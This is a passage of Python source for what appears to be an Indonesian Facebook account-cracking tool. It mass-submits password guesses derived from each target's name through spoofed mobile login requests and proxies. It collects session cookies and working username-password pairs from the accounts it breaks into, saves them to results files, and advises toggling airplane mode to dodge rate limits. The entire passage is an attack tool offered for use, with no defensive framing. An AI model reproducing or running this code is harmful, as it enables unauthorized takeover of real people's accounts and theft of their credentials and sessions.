                session.headers.update({'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = session.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=737229396381522&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Fapp_requests%3Fredirect_uri%3Dfbconnect%253A%252F%252Fcct.com.moonactive.coinmaster%26message%3DConvide%2Bseus%2Bamigos%26data%3D%257B%2B%2522s%2522%253A50%252C%2B%2522d%2522%253A%2B%25224b0afd0b-afe5-40cf-a124-6733e0d86404%2522%2B%2B%257D%26client_id%3D737229396381522%26ret%3Dlogin&cancel_url=fbconnect%3A%2F%2Fcct.com.moonactive.coinmaster%3Ferror_code%3D4201%26error_message%3DUser%2Bcanceled%2Bthe%2BDialog%2Bflow&display=touch&locale=id_ID&_rdr')
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+cebok+"/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
                koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                heade={'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://'+cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                po = session.post('https://'+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        tree = Tree("")
                        tree.add(f"{H}:{user}\n{pw}").add(f"{coki}{N}\n")
                        prints(tree)
                    elif "y" in Apk:
                        tree = Tree("")
                        tree.add(f"{H}id→{user}\npasword→{pw}").add(f"COKIES→{coki}{N}\n")
                        prints(tree)
                    wrt = 'OK %s √ %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    tree = Tree("")
                    tree.add(f"{K}ID→{user}\npasword→{pw}\n akun anda chepe di karna kan sarver facebok sedang update{N}\n")
                    prints(tree)
                    wrt = 'CP %s × %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
            self.__metode__(cebok, user, pasw)


    def __pler__(self):
        print('01:free.facebok.com')
        yan = input('\n %s%s%s pilih metode : '%(N,K,N))
        if yan == '':
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            xx = "free.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('2', '02'):
            xx = "mbasic.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('3', '03'):
            xx = "m.facebook.com"
            self.kombinasi_pw(xx)
        else:
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()

    def kombinasi_pw(self,url):
        
        print(' %s%s01%s FULL+NAMA'%(B,H,N))
       # print(' %s[%s2%s] nama,nama123,nama1234,nama12345'%(N,H,N))
        #print(' %s[%s3%s] nama,nama123,nama1234,nama12345,%s+Sandi%s'%(N,H,N,H,N))
        pw = input(f"\n {N}[{K}✌{N}] pilih : ")
        if pw in[""]:
            print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
        elif pw in["2","2"]:
          
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
                       else:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif pw in["1","01"]:
            print('CRAKER REDY')
            
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif pw in["3","03"]:
            
            #print(" %s[%s!%s] Semakin banyak kombinasi password semakin lama proses crack!"%(N,M,N))
            print(" %s[%s!%s] Use %sKOMMA%s for separator"%(N,M,N,H,N))
            print(" %s[%s!%s] Example : %ssayang,rahasia,bismillah%s"%(N,M,N,H,N))
            pw = input(f" {N}[{K}?{N}] Enter additional password : {H}").split(",")
            print('%s════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = xxx + pw
                       else:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = xxx + pw
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        else:
            print(f"\n {N}[{M}!{N}] Correct input");self.kombinasi_pw(url)

if __name__ == '__main__':
    login()
    #cek_pw()

